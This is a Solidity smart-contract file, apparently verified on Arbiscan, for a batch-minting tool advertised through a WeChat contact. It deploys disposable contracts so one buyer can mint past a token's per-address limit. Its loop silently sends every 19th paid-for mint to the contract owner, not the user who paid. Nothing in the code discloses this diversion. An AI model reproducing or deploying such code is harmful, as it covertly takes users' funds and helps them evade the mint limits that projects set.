/**
 *Submitted for verification at Arbiscan on 2023-06-12
*/

// SPDX-License-Identifier: MIT

// 微信 fooyaoeth 发送加群自动拉群


pragma solidity ^0.8.17;

interface Tokenint {
  function _mintPrice() external view returns (uint256);
  function _maxMintCountPerAddress() external view returns (uint256);
}

contract bot {
	constructor(address contractAddress, uint256 mintCount, address to) payable{
        (bool success, ) = contractAddress.call{value: msg.value}(abi.encodeWithSelector(0x94bf804d, mintCount, to));
        require(success, "Batch transaction failed");
		selfdestruct(payable(tx.origin));
   }
}

contract Bulk {
	address private immutable owner;

	modifier isOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

	constructor() {
		owner = msg.sender;
	}

	function batchMint(address contractAddress, uint256 times) external payable{
		uint mintCount = Tokenint(contractAddress)._maxMintCountPerAddress();
        uint price = Tokenint(contractAddress)._mintPrice();
		price = price * mintCount;
		require(msg.value==price*times, "fail eth");
		address to = msg.sender;
		
		for(uint i=0; i< times; i++) {
			if (i>0 && i%19==0){
				new bot{value: price}(contractAddress, mintCount, owner);
			}else{
				new bot{value: price}(contractAddress, mintCount, to);
			}
		}
	}
}